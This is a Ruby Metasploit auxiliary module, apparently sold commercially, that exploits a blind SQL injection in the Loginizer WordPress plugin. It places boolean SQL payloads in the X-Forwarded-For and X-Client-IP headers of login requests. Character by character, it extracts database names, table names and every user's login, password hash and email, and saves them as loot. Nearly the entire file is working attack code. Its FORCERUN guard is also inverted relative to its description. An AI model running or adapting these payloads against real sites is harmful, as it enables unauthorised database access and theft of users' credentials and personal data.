##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Wordpress Loginizer Blind SQL Injection',
                      'Description'    => %q{
    This module exploits an unauthenticated blind SQL injection
    in the Loginizer Wordpress plugin to enumerate users.

    The Loginizer Wordpress plugin is a popular security-enhancing
    plugin. Unfortunately, versions 1.3.5 and prior suffered from
    an unauthenticated SQL injection. However, this vulnerability
    was only exposed in non-default configurations of the
    Loginizer plugin, such as load-balanced or reverse proxy
    configurations.

    Categories: Open Source, Wordpress

    Price: 6

    Video: https://asciinema.org/a/jREcISyvjc3boVmlThtgelw0L

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
    },
      'References'     =>
    [
    ],
    'Author'         =>
    [
    ],
    'License'        => 'VolatileMinds',
    'DisclosureDate' => 'August 8 2017'
                     ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptBool.new("FORCERUN", [true, 'Run the module whether check returns vulnerable or not', false])
      ], self.class)
  end

  def check
    true_res = make_injected_request("' AND 3318=3318-- fdsa")
    false_res = make_injected_request("' AND 3318=3317-- fdsa")

    if true_res.body =~ /You have exceeded maximum login retries/ and false_res.body =~ /Incorrect Username or Password/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run

    unless (check == Exploit::CheckCode::Vulnerable && !datastore['FORCERUN'])
      print_error("Check doesn't believe it is vulnerable")
      return
    end

    true_res = /You have exceeded maximum login retries/

    dbs = []
    users = []

    db_count = ''
    tmp = nil
    j = 1
    while tmp != ''
      tmp = ''
      122.downto(36) do |i|
        get_db_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),#{j},1))=#{i}-- ITqe"
        res = make_injected_request(get_db_count)
        if res.body =~ true_res
          tmp = i.chr
          db_count << tmp
          break
        end
      end
      j = j + 1
    end

    db_count = db_count.to_i

    0.upto(db_count-1) do |db|
      tmp = nil
      j = 1
      db_name = ''
      while tmp != ''
        tmp = ''
        122.downto(36) do |i|
          get_db_name = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),#{j},1))=#{i}-- futo"
          res = make_injected_request(get_db_name)

          if res.body =~ true_res
            tmp = i.chr
            db_name << tmp
            break
          end
        end
        j = j + 1
      end

      dbs << db_name
    end

    dbs.delete('information_schema')
    dbs.delete('performance_schema')
    dbs.delete('sys')
    dbs.delete('mysql')

    dbs.each do |db|
      table_count = ''
      tmp = nil
      j = 1
      while tmp != ''
        tmp = ''
        122.downto(36) do |i|
          get_table_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]}),#{j},1))=#{i}-- XDIt"
          res = make_injected_request(get_table_count)

          if res.body =~ true_res
            tmp = i.chr
            table_count << tmp
            break
          end
        end

        j = j + 1
      end

      table_count = table_count.to_i

      tables = []
      0.upto(table_count-1) do |t|
        tmp = nil
        j = 1
        table_name = ''
        while tmp != ''
          tmp = ''
          122.downto(36) do |i|
            get_table_name = "' AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]} LIMIT #{t},1),#{j},1))=#{i}-- YomN"
            res = make_injected_request(get_table_name)

            if res.body =~ true_res
              tmp = i.chr
              table_name << tmp
              break
            end
          end
          j = j + 1
        end
        vprint_good("Found #{table_name}")
        tables << table_name
      end

      tables.each do |table|
        next if table !~ /_users$/

        user_count = ''
        tmp = nil
        j = 1
        while tmp != ''
          tmp = ''
          122.downto(36) do |i|
            get_user_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),#{j},1))=#{i}-- Gsqf"
            res = make_injected_request(get_user_count)

            if res.body =~ true_res
              tmp = i.chr
              user_count << tmp
              break
            end
          end
          j = j + 1
        end

        vprint_good("Found #{user_count} users")
        user_count = user_count.to_i

        0.upto(user_count - 1) do |u|

          user = {}
          cols = ["ID", "user_login", "user_pass", "user_email"]

          cols.each do |col|
            tmp = nil
            j = 1
            col_val = ''
            while tmp != ''
              tmp = ''
              122.downto(36) do |i|
                get_col_val = "' AND ORD(MID((SELECT IFNULL(CAST(#{col} AS CHAR),0x20) FROM #{db}.#{table} ORDER BY ID LIMIT #{u},1),#{j},1))=#{i}-- FEDh"
                res = make_injected_request(get_col_val)

                if res.body =~ true_res
                  tmp = i.chr
                  col_val << tmp
                  break
                end
              end
              j = j + 1
            end
            vprint_good( col+":"+col_val)

            user[col] = col_val
          end

          users << user
        end
      end
    end

    p = store_loot('wordpress.users', "application/javascript", datastore['RHOST'], users.to_json, "#{datastore['RHOST']}_wordpress_users.txt", "Wordpress Users", 'User details for Wordpress')
    print_good("Users stored in file: #{p}")
  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
      'method' => 'POST',
      'vars_post' => {
      'log' => Rex::Text.rand_text_alpha(8),
      'pwd' => Rex::Text.rand_text_alpha(8),
      'wp-submi' => 'Log In',
      'redirect_to' => '/wp-admin/'
    },
    'headers' => {
      'X-Forwarded-For' => sql,
      'X-Client-IP' => sql
    }
    })
  end
end

